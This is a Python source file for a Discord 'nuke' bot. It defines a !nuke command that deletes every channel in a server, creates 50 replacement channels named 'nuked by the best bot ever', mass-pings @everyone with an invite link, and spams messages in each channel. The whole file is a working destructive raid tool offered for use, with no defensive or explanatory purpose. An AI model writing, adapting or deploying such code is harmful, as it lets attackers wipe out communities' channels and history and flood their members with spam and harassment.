import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# Nuke variables
count_message = 1000
send_message_channels = 500
message = '@everyone got nuked by the best bot ever'
channel_create = 50
channel_name = 'nuked by the best bot ever'

# Nuke command
@bot.command()
async def nuke(ctx):
    await ctx.send(f"Nuking this server @everyone")

    # Delete all channels
    for channel in ctx.guild.channels:
        await channel.delete()

    # Create new channels
    for _ in range(channel_create):
        await ctx.guild.create_text_channel(channel_name)
    
    # Mass ping everyone
    for channel in ctx.guild.text_channels:
        await channel.send("@everyone https://discord.com/invite/JXj4upzNGb")
        await asyncio.sleep(0.10)  # Add a delay between pings

    # Spam messages in each channel
    for channel in ctx.guild.text_channels:
        for _ in range(15):  # Adjust the number of spam messages
            try:
                await channel.send(message)
            except discord.Forbidden:
                pass  # Bot doesn't have permission to send messages in the channel

bot.run("Your_Bot_Token_Here")
